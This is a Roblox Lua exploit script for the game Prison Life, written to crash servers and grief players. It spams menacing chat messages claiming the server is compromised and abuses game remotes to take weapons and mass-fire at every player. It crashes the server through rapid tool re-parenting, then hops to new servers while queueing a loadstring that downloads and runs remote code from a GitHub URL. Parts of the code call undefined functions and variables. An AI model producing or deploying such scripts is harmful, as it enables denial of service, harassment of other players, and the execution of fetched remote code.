pcall(function()
	task.wait(1)
	
	local Camera = game:GetService("Workspace").CurrentCamera
	local Rstorage = game:GetService("ReplicatedStorage")
	local Rservice = game:GetService("RunService")
	local Hbeat = Rservice.Heartbeat
	local Rstep = Rservice.RenderStepped
	local Stepped = Rservice.Stepped
	local Players = game:GetService("Players")
	local Teams = game:GetService("Teams")
	local LocalPlayer = Players.LocalPlayer
	
	if not LocalPlayer then
		repeat
			task.wait(0.1)
			LocalPlayer = Players.LocalPlayer
		until LocalPlayer
	end
	
	local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
	local RegModule = nil
	local SavedPositions = {};
	
	local ChatMessages = {
		"THIS SERVER HAS BEEN COMPROMISED BY THE 7TH BATTALION",
		"WE OWN PRISON LIFE AND ALL OF ITS PLAYERS", 
		"YOU ARE EXPENDABLE"
	}
	
	for Index, Message in ipairs(ChatMessages) do
		Rstorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(Message, "All")
		task.wait()
	end
	
	task.wait(1.25)
	
	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
	
	-- AntiCrash
	PlayerScripts:WaitForChild("ClientGunReplicator").Enabled = false
	
	local SaveCamPos = function()
		SavedPositions.OldCameraPos = Camera.CFrame
	end
	
	local LoadCamPos = function()
		Rstep:Wait()
		Camera.CFrame = SavedPositions.OldCameraPos or Camera.CFrame
	end
	
	local waitfor = function(source, args, interval)
		local int = interval or 5
		local timeout = tick() + int
		repeat Stepped:Wait() until source:FindFirstChild(args) or tick() - timeout >=0
		timeout = nil
		if source:FindFirstChild(args) then
			return source:FindFirstChild(args)
		else
			return nil
		end
	end
	
	local TeamEve = function(args)
		workspace.Remote.TeamEvent:FireServer(args)
	end
	
	local TeamTo = function(args)
		local tempos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame; SavedPositions.AutoRe = tempos; SaveCamPos()
		if args == "criminal" then
			if LocalPlayer.TeamColor.Name == "Medium stone grey" then
				TeamEve("Bright orange")
			end
			workspace["Criminals Spawn"].SpawnLocation.CanCollide = false
			repeat
				pcall(function()
					workspace["Criminals Spawn"].SpawnLocation.CFrame = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
				end)
				Stepped:Wait()
			until LocalPlayer.TeamColor == BrickColor.new("Really red")
			workspace['Criminals Spawn'].SpawnLocation.CFrame = SavedPositions.Crimpad
			return
		elseif args == "inmate" then
			TeamEve("Bright orange")
		elseif args == "guard" then
			TeamEve("Bright blue")
			if #Teams.Guards:GetPlayers() > 7 then
				return
			end
		end
		LocalPlayer.CharacterAdded:Wait(); waitfor(LocalPlayer.Character, "HumanoidRootPart", 5).CFrame = tempos; LoadCamPos()
	end
	
	local LocTP = function(cframe)
		LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = cframe
	end
	
	local LAction = function(args, args2)
		if args == "sit" then
			LocalPlayer.Character:FindFirstChild("Humanoid").Sit = true
		elseif args == "unsit" then
			if args2 then
				local human = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				for i = 1, 8 do Hbeat:Wait();human.Sit=false;Rstep:Wait();human.Sit=false;Stepped:Wait();human.Sit=false end
			end;LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Running)
		elseif args == "speed" then
			LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = args2
		elseif args == "jumppw" then
			LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = args2
		elseif args == "die" then
			LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
		elseif args == "died" then
			LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
		elseif args == "jump" then
			LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		elseif args == "state" then
			LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(args2)
		elseif args == "equip" then
			LocalPlayer.Character:FindFirstChild("Humanoid"):EquipTool(args2)
		elseif args == "unequip" then
			LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
		end
	end
	
	local RTPing = function(value)
		if value then
			task.wait(value)
		end
		local RT1 = tick()
		pcall(function()
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Car Spawner"]["Car Spawner"])
		end)
		local RT2 = tick()
		local RoundTrip = (RT2-RT1) * 1000
		return RoundTrip
	end
	
	local SpawnClientStuff = function(arg)
		if arg == "superknife" then
			ItemHand(false, "Crude Knife")
			local knife = LocalPlayer.Backpack:FindFirstChild("Crude Knife") or LocalPlayer.Character:FindFirstChild("Crude Knife")
			local animate = Instance.new("Animation", knife)
			animate.AnimationId = "rbxassetid://218504594"
			local animtrack = LocalPlayer.Character:FindFirstChild("Humanoid"):LoadAnimation(animate)
			local attacking = false
			local inPutCon = game:GetService("UserInputService").InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Crude Knife") then
						if not attacking then
							attacking = true
							animtrack:Play()
							for i,v in pairs(Players:GetPlayers()) do
								if not (v == LocalPlayer) then
									if v.Character and v.Character:FindFirstChild("Humanoid") then
										if not (v.Character:FindFirstChild("Humanoid").Health == 0) then
											local LPart, VPart = LocalPlayer.Character.PrimaryPart, v.Character.PrimaryPart
											if LPart and VPart then
												if (LPart.Position-VPart.Position).Magnitude <= 5 then
													for i = 1, 15 do
														MeleEve(v)
													end
												end
											end
										end
									end
								end
							end
							task.wait(.1)
							attacking = false
						end
					end
				end
			end)
			task.spawn(function()
				LocalPlayer.CharacterAdded:Wait()
				inPutCon:Disconnect(); animate:Destroy()
				animate = nil; animtrack = nil; inPutCon = nil
			end)
		elseif arg == "bat" then
			local tool = Instance.new("Tool", LocalPlayer.Backpack)
			tool.GripPos = Vector3.new(0.1, -1, 0)
			tool.Name = "Bat"
			local handle = Instance.new("Part", tool)
			handle.Name = "Handle"
			handle.Size = Vector3.new(0.4, 4, 0.4)
			local animate = Instance.new("Animation", tool)
			animate.AnimationId = "rbxassetid://218504594"
			local animtrack = LocalPlayer.Character.Humanoid:LoadAnimation(animate)
			local attacking = false
			local activate = tool.Activated:Connect(function()
				if not attacking then
					attacking = true
					animtrack:Play()
					task.wait(.1)
					attacking = false
				end
			end)
			local Touched = handle.Touched:Connect(function(part)
				if attacking then
					local human = part.Parent:FindFirstChild("Humanoid")
					if human then
						local plr = Players:FindFirstChild(part.Parent.Name)
						if plr then
							for i = 1, 10 do
								MeleEve(plr)
							end
						end
					end
				end
			end)
			task.spawn(function()
				LocalPlayer.CharacterAdded:Wait()
				activate:Disconnect(); Touched:Disconnect()
				handle:Destroy(); tool:Destroy(); animate:Destroy()
				animtrack = nil; animate = nil; attacking = nil
			end)
		elseif arg == "clicktp" then
			local newTool = Instance.new("Tool")
			newTool.RequiresHandle = false
			newTool.Name = "Click-TP"
			newTool.Parent = LocalPlayer.Backpack
			local tempocon = nil
			tempocon = newTool.Activated:Connect(function()
				local Get = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				local Wi = LocalPlayer:GetMouse().Hit
				local Fi = Wi.Position + Vector3.new(0, 2.5, 0)
				local Anywhere = Fi-Get.Position
				local YouGo = Get.CFrame + Anywhere
				Get.CFrame = YouGo
			end)
			task.spawn(function()
				LocalPlayer.CharacterAdded:Wait()
				newTool:Destroy(); tempocon:Disconnect()
				newTool = nil; tempocon = nil;
			end)
		elseif arg == "btools" then
			local hammer = Instance.new("HopperBin", LocalPlayer.Backpack)
			local gametool = Instance.new("HopperBin", LocalPlayer.Backpack)
			local scriptt = Instance.new("HopperBin", LocalPlayer.Backpack)
			local grab = Instance.new("HopperBin", LocalPlayer.Backpack)
			local clonee = Instance.new("HopperBin", LocalPlayer.Backpack)
			hammer.BinType = "Hammer"
			gametool.BinType = "GameTool"
			scriptt.BinType = "Script"
			grab.BinType = "Grab"
			clonee.BinType = "Clone"
		end
	end

	local ItemGrab = function(source, args)
		local lroot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart"); local timeout = tick() + 5
		if lroot then SavedPositions.GetGunOldPos = not SavedPositions.GetGunOldPos and lroot.CFrame or SavedPositions.GetGunOldPos; end
		local DaItem = source:FindFirstChild(args); local ItemPickup = DaItem.ITEMPICKUP; local IPickup = ItemPickup.Position
		if lroot then LocTP(CFrame.new(IPickup)); end; repeat task.wait()
			pcall(function()
				LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = false; LocTP(CFrame.new(IPickup))
			end); task.spawn(function()
				game:GetService("Workspace").Remote.ItemHandler:InvokeServer(ItemPickup)
			end)
		until LocalPlayer.Backpack:FindFirstChild(args) or LocalPlayer.Character:FindFirstChild(args) or tick() - timeout >=0
		pcall(function() LocTP(SavedPositions.GetGunOldPos); end); SavedPositions.GetGunOldPos = nil
	end
	
	local ItemHand = function(source, args)
		if source and source == "old" then
			game:GetService("Workspace").Remote.ItemHandler:InvokeServer(args)
			return
		end; if false then
			if source then
				ItemGrab(source, args)
			else
				for _,sources in pairs(workspace.Prison_ITEMS:GetChildren()) do
					if sources:FindFirstChild(args) then
						ItemGrab(source, args)
						break
					end
				end
			end
			return
		end; if source then
			workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = source:FindFirstChild(args)})
		else
			workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild(args) or workspace.Prison_ITEMS.single:FindFirstChild(args)})
		end
	end
	
	local Gun = function(args) 
		if false then
			ItemHand(workspace["Prison_ITEMS"].giver, args)
			return
		end; workspace.Remote.ItemHandler:InvokeServer({Position = LocalPlayer.Character.Head.Position, Parent = workspace.Prison_ITEMS.giver:FindFirstChild(args) or workspace.Prison_ITEMS.single:FindFirstChild(args)})
	end

	local AllGuns = function()
		if Settings.User.OldItemMethod then
			Gun("AK-47")
			Gun("Remington 870")
		else
			task.spawn(Gun, "AK-47")
			task.spawn(Gun, "Remington 870")
		end
		Gun("M9")
		if LocPL.Gamepass then
			Gun("M4A1")
		end; task.wait()
	end
	
	local AllItems = function()
		AllGuns()
		if not (LocalPlayer.TeamColor == BrickColor.new("Bright blue")) then
			ItemHand(false, "Crude Knife");ItemHand(false, "Hammer")
		elseif LocPL.Gamepass then
			if LocalPlayer.TeamColor == BrickColor.new("Bright blue") then
				ItemHand(false, "Riot Shield");ItemHand(workspace.Prison_ITEMS.clothes, "Riot Police")
			end;ItemHand(workspace.Prison_ITEMS.hats, "Riot helmet");ItemHand(workspace.Prison_ITEMS.hats, "Ski mask")
		end
		local Food = workspace.Prison_ITEMS.giver:FindFirstChild("Dinner") or workspace.Prison_ITEMS.giver:FindFirstChild("Breakfast") or workspace.Prison_ITEMS.giver:FindFirstChild("Lunch")
		if Food then
			ItemHand(false, Food.Name)
		end;if workspace.Prison_ITEMS.single:FindFirstChild("Key card") then
			ItemHand(workspace.Prison_ITEMS.single, "Key card")
		end
		SpawnClientStuff("bat");SpawnClientStuff("btools")
	end

	task.spawn(function()
		local america = {}
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
				america[#america+1] = {
					Hit = v.Character:FindFirstChildWhichIsA("BasePart");
					Cframe = v.Character.HumanoidRootPart.CFrame;
					Distance = math.huge;
					RayObject = Ray.new(Vector3.new(), Vector3.new())
				}
			end
		end
	
		print(`{#america} Players in server`)
	
		while task.wait(.4) do
			pcall(function()
				local new = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
				if not new then
					Gun("Remington 870")
					new = LocalPlayer.Backpack:FindFirstChild("Remington 870")
				end
				for i = 1, 250 do
					Rstorage.ShootEvent:FireServer(america, new)
				end
				task.wait(1)
			end)
		end
	end)

	task.spawn(function()
		AllItems()
		task.wait()
		LAction("unequip")
		local inter = args or 69
		local crashing = true
		do
			local g1, g2, g3 = LocalPlayer.Backpack:FindFirstChild("M9"), LocalPlayer.Backpack:FindFirstChild("Remington 870"), LocalPlayer.Backpack:FindFirstChild("AK-47")
			local i1, i2 = LocalPlayer.Backpack:FindFirstChild("Hammer"), LocalPlayer.Backpack:FindFirstChild("Crude Knife")
			local o1, o2 = LocalPlayer.Backpack:FindFirstChild("Dinner") or LocalPlayer.Backpack:FindFirstChild("Breakfast") or LocalPlayer.Backpack:FindFirstChild("Lunch"), LocalPlayer.Backpack:FindFirstChild("M4A1")
			g1.Grip = g1.Grip * CFrame.new(0, math.random(1, 69), 0); g1.Parent = LocalPlayer.Character
			g2.Grip = g2.Grip * CFrame.new(0, math.random(1, 69), 0); g2.Parent = LocalPlayer.Character
			g3.Grip = g3.Grip * CFrame.new(0, math.random(1, 69), 0); g3.Parent = LocalPlayer.Character
			if i1 and i2 then
				i1.Grip = i1.Grip * CFrame.new(0, math.random(1, 69), 0); i1.Parent = LocalPlayer.Character
				i2.Grip = i2.Grip * CFrame.new(0, math.random(1, 69), 0); i2.Parent = LocalPlayer.Character
			end; if o2 then
				o2.Grip = o2.Grip * CFrame.new(0, math.random(1, 69), 0); o2.Parent = LocalPlayer.Character
			end; if o1 then
				o1.Grip = o1.Grip * CFrame.new(0, math.random(1, 69), 0); o1.Parent = LocalPlayer.Character
			end
		end; task.delay(inter, function()
			--crashing = nil
		end)
		while crashing do
			for i,v in pairs(LocalPlayer.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Grip = v.Grip * CFrame.Angles(0, math.rad(8), 0)
					v.Parent = LocalPlayer.Backpack
					v.Parent = LocalPlayer.Character
				end
			end
			Rstep:Wait()
		end; wait(1); LAction("unequip")
	end)
	
	print("Crashing Server...")	
	if #game.Players:GetPlayers() >= 10 then
		game:GetService("GuiService").ErrorMessageChanged:Wait()
		warn("KICKED FROM GAME")
		task.wait(1)
	end
end)

-- Auto Attach on Server hop
local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local HttpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
	
warn("SERVER HOPPING")
while true do
	local s,f = pcall(function()
		local found, get = {}, HttpRequest
		local data = get({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", game.PlaceId)})
		local decode = game:GetService("HttpService"):JSONDecode(data.Body)
		if decode and decode.data then
			for i,v in pairs(decode.data) do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
					table.insert(found, 1, v.id)
				end
			end
		end;if next(found) then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, found[math.random(1, #found)], LocalPlayer)
			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ajbeaver25/PrisonLifeCrash-ServerHop/refs/heads/main/source.lua'))()")
		end
	end);

	task.wait(8)
end
